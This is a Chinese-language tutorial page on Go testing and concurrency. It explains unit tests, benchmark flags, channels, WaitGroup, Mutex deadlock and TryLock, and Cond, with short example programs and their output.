<h2 id="unit"><a href="#unit" class="headerlink" title="unit"></a>unit</h2><ul>
<li>支持根据测试场景使用 <code>t.Run()</code> 创建不同的子测试用例</li>
<li><code>go test</code> 命令用于单元测试选项：<ul>
<li><code>-run TestAdd</code> 过滤测试用例（支持正则表达式）</li>
</ul>
</li>
<li>示例：<ul>
<li><code>go test -run=&quot;TestConcatByBuilder&quot; . -v</code></li>
</ul>
</li>
</ul>
<div class="tabs" id="go-testing-test"><ul class="nav-tabs"><li class="tab active"><a href="#go-testing-test-1">Basic</a></li><li class="tab"><a href="#go-testing-test-2">Subtest</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-testing-test-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dep/str.go</span></span><br><span class="line"><span class="keyword">package</span> dep</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;math/rand&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> letterBytes = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RandomString</span><span class="params">(n <span class="type">int</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    b := <span class="built_in">make</span>([]<span class="type">byte</span>, n)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> b &#123;</span><br><span class="line">        b[i] = letterBytes[rand.Intn(<span class="built_in">len</span>(letterBytes))]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dep/str_test.go</span></span><br><span class="line"><span class="keyword">package</span> dep_test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line">    <span class="string">&quot;testing&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;example.com/dep&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestConcatByBuilder</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> str = dep.RandomString(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">var</span> builder strings.Builder</span><br><span class="line">    <span class="built_in">cap</span> := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">if</span> builder.Cap() != <span class="built_in">cap</span> &#123;</span><br><span class="line">            fmt.Print(builder.Cap(), <span class="string">&quot; &quot;</span>)</span><br><span class="line">            <span class="built_in">cap</span> = builder.Cap()</span><br><span class="line">        &#125;</span><br><span class="line">        builder.WriteString(str)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">strings.Builder内存申请过程:</span></span><br><span class="line"><span class="comment">16 32 64 128 256 512 896 1408 2048 3072 4096 5376 6912 9472 ...</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-testing-test-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dep/calc_test.go</span></span><br><span class="line"><span class="keyword">package</span> dep_test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;testing&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;example.com/dep&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestMulOnTableDriven</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    cases := []<span class="keyword">struct</span> &#123;</span><br><span class="line">        Name           <span class="type">string</span></span><br><span class="line">        A, B, Expected <span class="type">int</span></span><br><span class="line">    &#125;&#123;</span><br><span class="line">        &#123;<span class="string">&quot;pos&quot;</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;neg&quot;</span>, <span class="number">2</span>, <span class="number">-3</span>, <span class="number">-6</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;zero&quot;</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, c := <span class="keyword">range</span> cases &#123;</span><br><span class="line">        t.Run(c.Name, <span class="function"><span class="keyword">func</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ans := dep.Mul(c.A, c.B); ans != c.Expected &#123;</span><br><span class="line">                t.Fatalf(<span class="string">&quot;%d * %d expected %d, but %d got&quot;</span>,</span><br><span class="line">                    c.A, c.B, c.Expected, ans)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark"></a>benchmark</h2><ul>
<li>基准测试用于度量某个函数的性能，函数名以<em>Benchmark</em>开头</li>
<li>测试命令（<code>-bench</code>参数，默认<code>-cpu=GOMAXPROCS -benchtime=1s -count=1</code>）：<ul>
<li><code>go test -bench=&#39;.*&#39; abc_test.go</code> 运行abc_test.go中的用例</li>
<li><code>go test -bench=&#39;Fib$&#39; .</code> 运行正则匹配’Fib$’的用例（当前package内）</li>
<li><code>go test -bench=&#39;.*&#39; -cpu=2,4 .</code> 以2核和4核cpu运行用例</li>
<li><code>go test -bench=&#39;.*&#39; -benchtime=5s .</code> 以5s作为基准运行用例</li>
<li><code>go test -bench=&#39;.*&#39; -benchtime=30x .</code> 以30次作为基准运行用例</li>
<li><code>go test -bench=&#39;.*&#39; -count=3 .</code> 运行3轮benchmark用例</li>
<li><code>go test -bench=&#39;.*&#39; -benchmem .</code> 运行用例时度量内存分配的次数</li>
<li><code>go test -bench=&#39;.*&#39; -cpuprofile=cpu.pprof .</code> 运行用例时生成cpu.pprof文件</li>
<li><code>go test -bench=&#39;.*&#39; -blockprofile=block.pprof .</code> 运行用例时生成block.pprof文件</li>
<li><code>go test -bench=&#39;.*&#39; -memprofile=mem.pprof .</code> 运行用例时生成mem.pprof文件</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-testing-benchmark"><ul class="nav-tabs"><li class="tab active"><a href="#go-testing-benchmark-1">Accuracy</a></li><li class="tab"><a href="#go-testing-benchmark-2">Memory</a></li><li class="tab"><a href="#go-testing-benchmark-3">Timer</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-testing-benchmark-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dep/fib.go</span></span><br><span class="line"><span class="keyword">package</span> dep</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Fib</span><span class="params">(n <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> || n == <span class="number">1</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Fib(n<span class="number">-2</span>) + Fib(n<span class="number">-1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dep/fib_test.go</span></span><br><span class="line"><span class="keyword">package</span> dep_test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;testing&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;example.com/x/dep&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkFib</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    time.Sleep(time.Second * <span class="number">3</span>)</span><br><span class="line">    b.ResetTimer() <span class="comment">// 消除上面sleep的影响</span></span><br><span class="line">    <span class="keyword">for</span> n := <span class="number">0</span>; n &lt; b.N; n++ &#123;</span><br><span class="line">        dep.Fib(<span class="number">30</span>) <span class="comment">// run fib(30) b.N times</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-testing-benchmark-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dep/mem_test.go</span></span><br><span class="line"><span class="keyword">package</span> dep_test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;math/rand&quot;</span></span><br><span class="line">    <span class="string">&quot;testing&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">generate</span><span class="params">(n <span class="type">int</span>, hasCap <span class="type">bool</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">    rand.Seed(time.Now().UnixNano())</span><br><span class="line">    <span class="keyword">var</span> nums []<span class="type">int</span></span><br><span class="line">    <span class="keyword">if</span> hasCap &#123;</span><br><span class="line">        nums = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>, n)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        nums = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">        nums = <span class="built_in">append</span>(nums, rand.Int())</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BmGenerate</span><span class="params">(n <span class="type">int</span>, hasCap <span class="type">bool</span>, b *testing.B)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">        generate(n, hasCap)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkGenerateNoCap1</span><span class="params">(b *testing.B)</span></span>        &#123; BmGenerate(<span class="number">1</span>, <span class="literal">false</span>, b) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkGenerateNoCap10</span><span class="params">(b *testing.B)</span></span>       &#123; BmGenerate(<span class="number">10</span>, <span class="literal">false</span>, b) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkGenerateNoCap100</span><span class="params">(b *testing.B)</span></span>      &#123; BmGenerate(<span class="number">100</span>, <span class="literal">false</span>, b) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkGenerateNoCap1000</span><span class="params">(b *testing.B)</span></span>     &#123; BmGenerate(<span class="number">1000</span>, <span class="literal">false</span>, b) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkGenerateNoCap10000</span><span class="params">(b *testing.B)</span></span>    &#123; BmGenerate(<span class="number">10000</span>, <span class="literal">false</span>, b) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkGenerateNoCap100000</span><span class="params">(b *testing.B)</span></span>   &#123; BmGenerate(<span class="number">100000</span>, <span class="literal">false</span>, b) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkGenerateNoCap1000000</span><span class="params">(b *testing.B)</span></span>  &#123; BmGenerate(<span class="number">1000000</span>, <span class="literal">false</span>, b) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkGenerateHasCap1000000</span><span class="params">(b *testing.B)</span></span> &#123; BmGenerate(<span class="number">1000000</span>, <span class="literal">true</span>, b) &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$ go test -bench=&#x27;Generate&#x27; -benchtime=10x -benchmem .</span></span><br><span class="line"><span class="comment">BenchmarkGenerateNoCap1-4         10          11355 ns/op             8 B/op       1 allocs/op</span></span><br><span class="line"><span class="comment">BenchmarkGenerateNoCap10-4        10           9826 ns/op           248 B/op       5 allocs/op</span></span><br><span class="line"><span class="comment">BenchmarkGenerateNoCap100-4       10          10926 ns/op          2040 B/op       8 allocs/op</span></span><br><span class="line"><span class="comment">BenchmarkGenerateNoCap1000-4      10          37334 ns/op         25208 B/op      12 allocs/op</span></span><br><span class="line"><span class="comment">BenchmarkGenerateNoCap10000-4     10         291248 ns/op        357624 B/op      19 allocs/op</span></span><br><span class="line"><span class="comment">BenchmarkGenerateNoCap100000-4    10        3306200 ns/op       4101413 B/op      28 allocs/op</span></span><br><span class="line"><span class="comment">BenchmarkGenerateNoCap1000000-4   10       60037981 ns/op      41678156 B/op      38 allocs/op</span></span><br><span class="line"><span class="comment">BenchmarkGenerateHasCap1000000-4  10       20238641 ns/op       8003593 B/op       1 allocs/op</span></span><br><span class="line"><span class="comment">Note: NameOfBenchmark-CPU    NumOfIter(b.N)       Time/op  BytesAllocated/op   NumOfMemAllocation/op</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-testing-benchmark-3"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sort_test.go</span></span><br><span class="line"><span class="keyword">package</span> dep_test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;math/rand&quot;</span></span><br><span class="line">    <span class="string">&quot;testing&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">generateHasCap</span><span class="params">(n <span class="type">int</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">    rand.Seed(time.Now().UnixNano())</span><br><span class="line">    nums := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>, n)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">        nums = <span class="built_in">append</span>(nums, rand.Int())</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bubbleSort</span><span class="params">(nums []<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(nums); i++ &#123;</span><br><span class="line">        <span class="keyword">for</span> j := <span class="number">1</span>; j &lt; <span class="built_in">len</span>(nums)-i; j++ &#123;</span><br><span class="line">            <span class="keyword">if</span> nums[j] &lt; nums[j<span class="number">-1</span>] &#123;</span><br><span class="line">                nums[j], nums[j<span class="number">-1</span>] = nums[j<span class="number">-1</span>], nums[j]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkBubbleSort</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> n := <span class="number">0</span>; n &lt; b.N; n++ &#123;</span><br><span class="line">        b.StopTimer()</span><br><span class="line">        nums := generateHasCap(<span class="number">10000</span>)</span><br><span class="line">        b.StartTimer()</span><br><span class="line"></span><br><span class="line">        bubbleSort(nums)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="sync"><a href="#sync" class="headerlink" title="sync"></a>sync</h1><h2 id="Channel"><a href="#Channel" class="headerlink" title="Channel"></a>Channel</h2><ul>
<li>无缓冲（unbuffered）通道（S先等R就绪，然后R等S发送）：<ol>
<li>sender会阻塞等待，直到receiver准备就绪后才会发送数据</li>
<li>receiver会阻塞等待，直到sender发送了数据</li>
</ol>
</li>
<li>有缓冲（buffered）通道（类似semaphore）：<ol>
<li>buffer满了后，sender才会阻塞等待，直到buffer再次有空余</li>
<li>buffer空了后，receiver才会阻塞等待，直到buffer再次有数据</li>
</ol>
</li>
<li>关闭通道后，receiver才会接收到zero值（零值表示通道被关闭了）</li>
</ul>
<div class="tabs" id="go-sync-channel"><ul class="nav-tabs"><li class="tab active"><a href="#go-sync-channel-1">UnbufferedChannelSync</a></li><li class="tab"><a href="#go-sync-channel-2">BufferedChannelSync</a></li><li class="tab"><a href="#go-sync-channel-3">CloseChannel</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-sync-channel-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>) <span class="comment">// (unbuffered channel)</span></span><br><span class="line"><span class="keyword">var</span> a <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">()</span></span> &#123;</span><br><span class="line">    a = <span class="string">&quot;Hi&quot;</span></span><br><span class="line">    &lt;-c <span class="comment">// (synchronized: receiver is executed after that sender is complete)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> f()</span><br><span class="line">    c &lt;- <span class="number">0</span>   <span class="comment">// (sender)</span></span><br><span class="line">    <span class="built_in">print</span>(a) <span class="comment">// Hi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-sync-channel-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Example_1</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">10</span>) <span class="comment">// (buffered channel)</span></span><br><span class="line"><span class="keyword">var</span> a <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">()</span></span> &#123;</span><br><span class="line">    a = <span class="string">&quot;Hi&quot;</span></span><br><span class="line">    c &lt;- <span class="number">0</span> <span class="comment">// (sender)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> f()</span><br><span class="line">    &lt;-c      <span class="comment">// (synchronized: receiver wait until sender is complete)</span></span><br><span class="line">    <span class="built_in">print</span>(a) <span class="comment">// Hi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Example_2: Limit concurrency by buffered channel</span></span><br><span class="line"><span class="keyword">var</span> limit = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> _, w := <span class="keyword">range</span> work &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(w <span class="keyword">func</span>()</span></span>) &#123;</span><br><span class="line">            limit &lt;- <span class="number">1</span></span><br><span class="line">            w()</span><br><span class="line">            &lt;-limit</span><br><span class="line">        &#125;(w)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">select</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-sync-channel-3"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">10</span>) <span class="comment">// (buffered channel)</span></span><br><span class="line"><span class="keyword">var</span> a <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">()</span></span> &#123;</span><br><span class="line">    a = <span class="string">&quot;Hi&quot;</span></span><br><span class="line">    <span class="built_in">close</span>(c)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> f()</span><br><span class="line">    &lt;-c      <span class="comment">// (synchronized: closing of c is synchronized before receiver that return a zero value)</span></span><br><span class="line">    <span class="built_in">print</span>(a) <span class="comment">// Hi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="WaitGroup"><a href="#WaitGroup" class="headerlink" title="WaitGroup"></a>WaitGroup</h2><ul>
<li><code>sync.WaitGroup</code>用于等待一组goroutine完成</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">        wg.Add(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">            <span class="keyword">defer</span> wg.Done()</span><br><span class="line">            <span class="comment">// do some work</span></span><br><span class="line">            fmt.Println(<span class="string">&quot;goroutine&quot;</span>, i)</span><br><span class="line">        &#125;(i)</span><br><span class="line">    &#125;</span><br><span class="line">    wg.Wait()</span><br><span class="line">    fmt.Println(<span class="string">&quot;all goroutines done&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*[OUTPUT]</span></span><br><span class="line"><span class="comment">goroutine 4</span></span><br><span class="line"><span class="comment">goroutine 2</span></span><br><span class="line"><span class="comment">goroutine 3</span></span><br><span class="line"><span class="comment">goroutine 0</span></span><br><span class="line"><span class="comment">goroutine 1</span></span><br><span class="line"><span class="comment">all goroutines done</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h2 id="Mutex"><a href="#Mutex" class="headerlink" title="Mutex"></a>Mutex</h2><ul>
<li>两个互斥锁（mutex）互相等待会产生死锁（deadlock）<ul>
<li>通过<code>sync.TryLock()</code>虽然可以避免死锁，但不建议这样处理，使用这个方法意味着程序有更深层次的问题</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-sync-mutex"><ul class="nav-tabs"><li class="tab active"><a href="#go-sync-mutex-1">DeadLock</a></li><li class="tab"><a href="#go-sync-mutex-2">TryLock</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-sync-mutex-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    m1 sync.Mutex</span><br><span class="line">    m2 sync.Mutex</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// deadlock (goroutine 1和2互相等待产生死锁，直到main goroutine退出)</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;goroutine 1S&quot;</span>)</span><br><span class="line">        m1.Lock()</span><br><span class="line">        <span class="keyword">defer</span> m1.Unlock()</span><br><span class="line">        time.Sleep(time.Second)</span><br><span class="line">        m2.Lock()</span><br><span class="line">        <span class="keyword">defer</span> m2.Unlock()</span><br><span class="line">        fmt.Println(<span class="string">&quot;goroutine 1E&quot;</span>)</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;goroutine 2S&quot;</span>)</span><br><span class="line">        m2.Lock()</span><br><span class="line">        <span class="keyword">defer</span> m2.Unlock()</span><br><span class="line">        time.Sleep(time.Second)</span><br><span class="line">        m1.Lock()</span><br><span class="line">        <span class="keyword">defer</span> m1.Unlock()</span><br><span class="line">        fmt.Println(<span class="string">&quot;goroutine 2E&quot;</span>)</span><br><span class="line">    &#125;()</span><br><span class="line">    time.Sleep(<span class="number">5</span> * time.Second)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*[OUTPUT]</span></span><br><span class="line"><span class="comment">goroutine 2S</span></span><br><span class="line"><span class="comment">goroutine 1S</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-sync-mutex-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    m1 sync.Mutex</span><br><span class="line">    m2 sync.Mutex</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> m1.TryLock() &#123;</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">            time.Sleep(time.Millisecond)</span><br><span class="line">        &#125;</span><br><span class="line">        time.Sleep(time.Second)</span><br><span class="line">        m1.Unlock()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> m2.TryLock() &#123;</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">            time.Sleep(time.Millisecond)</span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println(<span class="string">&quot;goroutine 1&quot;</span>)</span><br><span class="line">        m2.Unlock()</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> m2.TryLock() &#123;</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">            time.Sleep(time.Millisecond)</span><br><span class="line">        &#125;</span><br><span class="line">        time.Sleep(time.Second)</span><br><span class="line">        m2.Unlock()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> m1.TryLock() &#123;</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">            time.Sleep(time.Millisecond)</span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println(<span class="string">&quot;goroutine 2&quot;</span>)</span><br><span class="line">        m1.Unlock()</span><br><span class="line">    &#125;()</span><br><span class="line">    time.Sleep(<span class="number">5</span> * time.Second)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*[OUTPUT]</span></span><br><span class="line"><span class="comment">goroutine 2</span></span><br><span class="line"><span class="comment">goroutine 1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="Cond"><a href="#Cond" class="headerlink" title="Cond"></a>Cond</h2><ul>
<li>Cond实现了条件变量（condition variable），相关的Locker可以是Mutex或RWMutex<ul>
<li>简单场景下，使用Channel比Cond更合适<ul>
<li><code>Broadcast()</code>相当于关闭通道（closing a channel）</li>
<li><code>Signal()</code>相当于向通道发送数据（sending on a channel）</li>
</ul>
</li>
</ul>
</li>
</ul>
